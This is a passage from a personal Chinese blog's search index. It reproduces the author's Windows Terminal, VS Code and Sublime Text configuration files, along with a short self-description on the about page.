visit https://aka.ms/terminal-global-settings // If enabled, selections are automatically copied to your clipboard. \"copyOnSelect\": false, // If enabled, formatted data is also copied to your clipboard \"copyFormatting\": false, // A profile specifies a command to execute paired with information about how it should look and feel. // Each one of them will appear in the 'New Tab' dropdown, // and can be invoked from the commandline with `wt.exe -p xxx` // To learn more about profiles, visit https://aka.ms/terminal-profile-settings \"profiles\": { \"defaults\": { // Put settings here that you want to apply to all profiles. }, \"list\": [ { \"guid\": \"{2c4de342-38b7-51cf-b940-2309a097f518}\", \"hidden\": false, \"name\": \"Ubuntu\", \"source\": \"Windows.Terminal.Wsl\", \"fontFace\" : \"monaco\", \"padding\" : \"5, 5, 5, 5\", \"suppressApplicationTitle\": true, \"tabTitle\": \"Ubuntu\", \"acrylicOpacity\": 0.7, \"useAcrylic\": true, \"acrylicOpacity\" : 0.70, \"cursorColor\": \"#4ab118\", //光标颜色 \"fontSize\": 11, \"snapOnInput\" : true, \"cursorShape\": \"filledBox\", //光标形状 \"commandline\": \"ubuntu\", \"colorScheme\" : \"Ubuntu\" }, { // Make changes here to the powershell.exe profile. \"guid\": \"{61c54bbd-c2c6-5271-96e7-009a87ff44bf}\", \"name\": \"Windows PowerShell\", \"commandline\": \"powershell.exe\", \"hidden\": false, \"fontFace\" : \"monaco\", \"hidden\": false, \"acrylicOpacity\": 0.7, \"useAcrylic\": true, \"colorScheme\" : \"AdventureTime\" }, { // Make changes here to the cmd.exe profile. \"guid\": \"{0caa0dad-35be-5f56-a8ff-afceeeaa6101}\", \"name\": \"命令提示符\", \"commandline\": \"cmd.exe\", \"hidden\": false, \"fontFace\" : \"monaco\", \"padding\" : \"5, 5, 5, 5\", \"suppressApplicationTitle\": false, \"tabTitle\": \"CMD\", \"colorScheme\" : \"Ubuntu\", \"cursorColor\": \"#4ab118\", //光标颜色 \"fontSize\": 11, \"snapOnInput\" : true, \"cursorShape\": \"filledBox\", \"startingDirectory\": \"D:\\\\Xray\", }, { \"guid\": \"{b453ae62-4e3d-5e58-b989-0a998ec441b8}\", \"hidden\": false, \"name\": \"Azure Cloud Shell\", \"source\": \"Windows.Terminal.Azure\" } ] }, // Add custom color schemes to this array. // To learn more about color schemes, visit https://aka.ms/terminal-color-schemes \"schemes\": [ { \"name\": \"Ubuntu\", \"black\": \"#2e3436\", \"red\": \"#cc0000\", \"green\": \"#2fff24\", \"yellow\": \"#c4a000\", \"blue\": \"#3465a4\", \"purple\": \"#75507b\", \"cyan\": \"#06989a\", \"white\": \"#d3d7cf\", \"brightBlack\": \"#555753\", \"brightRed\": \"#ef2929\", \"brightGreen\": \"#8ae234\", \"brightYellow\": \"#fce94f\", \"brightBlue\": \"#729fcf\", \"brightPurple\": \"#ad7fa8\", \"brightCyan\": \"#34e2e2\", \"brightWhite\": \"#eeeeec\", \"background\": \"#300a24\", \"foreground\": \"#eeeeec\" }, { \"name\": \"AdventureTime\", \"black\": \"#050404\", \"red\": \"#bd0013\", \"green\": \"#4ab118\", \"yellow\": \"#e7741e\", \"blue\": \"#0f4ac6\", \"purple\": \"#665993\", \"cyan\": \"#70a598\", \"white\": \"#f8dcc0\", \"brightBlack\": \"#4e7cbf\", \"brightRed\": \"#fc5f5a\", \"brightGreen\": \"#9eff6e\", \"brightYellow\": \"#efc11a\", \"brightBlue\": \"#1997c6\", \"brightPurple\": \"#9b5953\", \"brightCyan\": \"#c8faf4\", \"brightWhite\": \"#f6f5fb\", \"background\": \"#1f1d45\", \"foreground\": \"#f8dcc0\" }], // Add custom actions and keybindings to this array. // To unbind a key combination from your defaults.json, set the command to \"unbound\". // To learn more about actions and keybindings, visit https://aka.ms/terminal-keybindings \"actions\": [ // Copy and paste are bound to Ctrl+Shift+C a","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:4","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"VS Code { \"files.autoSave\": \"onFocusChange\", \"editor.cursorStyle\": \"block\", \"editor.autoClosingBrackets\": \"never\", \"editor.fontSize\": 16, \"editor.suggestSelection\": \"first\", \"editor.rulers\": [100], \"workbench.colorCustomizations\": { // 行号数字的颜色 \"editorLineNumber.foreground\": \"#17a346\", // 光标的颜色 \"editorCursor.foreground\": \"#138136\", \"editor.selectionBackground\": \"#7c857f\", \"editor.background\": \"#413e3e\", \"activityBar.background\": \"#524f4f\", \"statusBar.background\": \"#524f4f\", \"activityBarBadge.background\": \"#2979FF\", \"activityBar.activeBorder\": \"#2979FF\", \"list.activeSelectionForeground\": \"#2979FF\", \"list.inactiveSelectionForeground\": \"#2979FF\", \"list.highlightForeground\": \"#2979FF\", \"scrollbarSlider.activeBackground\": \"#2979FF50\", \"editorSuggestWidget.highlightForeground\": \"#2979FF\", \"textLink.foreground\": \"#2979FF\", \"progressBar.background\": \"#2979FF\", \"pickerGroup.foreground\": \"#2979FF\", \"tab.activeBorder\": \"#2979FF\", \"notificationLink.foreground\": \"#2979FF\", \"editorWidget.resizeBorder\": \"#2979FF\", \"editorWidget.border\": \"#2979FF\", \"settings.modifiedItemIndicator\": \"#2979FF\", \"settings.headerForeground\": \"#2979FF\", \"panelTitle.activeBorder\": \"#2979FF\", \"breadcrumb.activeSelectionForeground\": \"#2979FF\", \"menu.selectionForeground\": \"#2979FF\", \"menubar.selectionForeground\": \"#2979FF\", \"editor.findMatchBorder\": \"#2979FF\", \"selection.background\": \"#13cc7040\", \"statusBarItem.remoteBackground\": \"#2979FF\" }, \"materialTheme.accent\": \"Blue\", \"terminal.integrated.fontFamily\": \"monaco\", \"editor.fontFamily\": \"Fira Code\", \"editor.fontLigatures\": true, \"editor.cursorBlinking\": \"phase\", \"editor.fontWeight\": \"490\", \"editor.autoClosingQuotes\": \"never\", \"editor.autoSurround\": \"never\", \"editor.renderIndentGuides\": false, \"workbench.tree.renderIndentGuides\": \"none\", \"editor.highlightActiveIndentGuide\": false, \"editor.copyWithSyntaxHighlighting\": false, \"editor.renderLineHighlight\": \"none\", \"workbench.editorAssociations\": { \"*.ipynb\": \"jupyter-notebook\" }, \"workbench.colorTheme\": \"Seti Monokai\", \"workbench.editor.untitled.hint\": \"hidden\", \"workbench.iconTheme\": \"vscode-icons\", \"workbench.startupEditor\": \"none\", \"notebook.cellToolbarLocation\": { \"default\": \"right\", \"jupyter-notebook\": \"left\" }, \"editor.tokenColorCustomizations\": { \"textMateRules\": [ { \"name\": \"Comment\", \"scope\": [ \"comment\", \"comment.block\", \"comment.block.documentation\", \"comment.line\", \"comment.line.double-slash\", \"punctuation.definition.comment\", ], \"settings\": { \"fontStyle\": \"\", //斜体 \"fontStyle\": \"italic\", //斜体下划线 \"fontStyle\": \"italic underline\", //斜体粗体下划线 \"fontStyle\": \"italic bold underline\", } }, ] }, \"workbench.settings.editor\": \"json\", } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:5","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":["其他"],"content":"Sublimetext3 { \"auto_complete\": true, \"auto_match_enabled\": false, \"color_scheme\": \"Packages/Color Scheme - Default/Monokai.sublime-color-scheme\", \"dictionary\": \"Packages/Language - English/en_GB.dic\", \"font_face\": \"monaco\", \"font_size\": 12, \"ignored_packages\": [ \"Vintage\" ] } bracket: { \"bracket_styles\": { // `default` and `unmatched` styles are special // styles. If they are not defined here, // they will be generated internally with // internal defaults. // `default` style defines attributes that // will be used for any style that does not // explicitly define that attribute. So if // a style does not define a color, it will // use the color from the \"default\" style. \"default\": { \"icon\": \"dot\", // Support the old convention of `brackethighlighter.default` // for themes that already provide something. // As this has always been the only one we've provided // by default, all the others will use region-ish colors. \"color\": \"region.yellowish brackethighlighter.default\", // \"style\": \"underline\" \"style\": \"hightlight\" }, // This particular style is used to highlight // unmatched bracket pairs. It is a special // style. \"unmatched\": { \"icon\": \"question\", \"color\": \"region.redish\", \"style\": \"outline\" }, // User defined region styles \"curly\": { \"icon\": \"curly_bracket\", \"color\": \"region.purplish\", \"style\": \"hightlight\" }, \"round\": { \"icon\": \"round_bracket\", \"color\": \"region.yellowish\", \"style\": \"hightlight\" }, \"square\": { \"icon\": \"square_bracket\", \"color\": \"region.bluish\", \"style\": \"hightlight\" }, //下面的都是原来的样式 \"angle\": { \"icon\": \"angle_bracket\", \"color\": \"region.orangish\" // \"style\": \"underline\" }, \"tag\": { \"icon\": \"tag\", \"color\": \"region.orangish\" // \"style\": \"underline\" }, \"c_define\": { \"icon\": \"hash\", \"color\": \"region.yellowish\" // \"style\": \"underline\" }, \"single_quote\": { \"icon\": \"single_quote\", \"color\": \"region.greenish\" // \"style\": \"underline\" }, \"double_quote\": { \"icon\": \"double_quote\", \"color\": \"region.greenish\" // \"style\": \"underline\" }, \"regex\": { \"icon\": \"star\", \"color\": \"region.greenish\" // \"style\": \"underline\" } } } ","date":"2022-02-01","objectID":"https://songzhiv.github.io/config/:2:6","tags":null,"title":"个人配置","uri":"https://songzhiv.github.io/config/"},{"categories":null,"content":"学习路上的小废物。 半吊子的安服仔。 WX：subv_nmk ","date":"0001-01-01","objectID":"https://songzhiv.github.io/about/:0:0","tags":null,"title":"","uri":"https://songzhiv.github.io/about/"}]